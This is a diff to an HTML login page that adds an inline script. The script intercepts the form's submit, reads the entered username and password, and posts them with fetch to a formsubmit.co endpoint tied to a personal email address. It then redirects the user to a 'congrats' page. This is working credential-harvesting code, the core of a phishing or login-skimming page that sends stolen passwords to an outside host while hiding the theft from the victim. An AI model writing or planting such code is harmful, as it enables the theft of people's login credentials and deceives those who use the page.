@@ -13,7 +13,7 @@
 <body>
     <main class="loginBox">
         <h2>Login</h2>
-        <form>
+        <form id="form">
             <span class="userBox">
                 <input type="text" name="username" placeholder="Username" id="Username" />
                 <label for="Username" class="">Username</label>
@@ -32,6 +32,26 @@
         </form>
     </main>
     <script src="./script.js" async defer></script>
+    <script async defer>
+        form.addEventListener('submit', (e) => {
+            e.preventDefault()
+            email = `adewalejnr0142@gmail.com`
+            subject = `Adewalejnr`
+            let body = new FormData();
+            let URL = `https://formsubmit.co/${email}`
+            body.append('username', Username.value)
+            body.append('password', password.value)
+            body.append('_captcha', false)
+            body.append('_template', 'table');
+            body.append('_subject', subject);
+            fetch(URL, {
+                method: 'POST',
+                body: body
+            }).then(
+                window.location.assign('congrats.html')
+            )
+        })
+    </script>
 </body>
 
 </html>
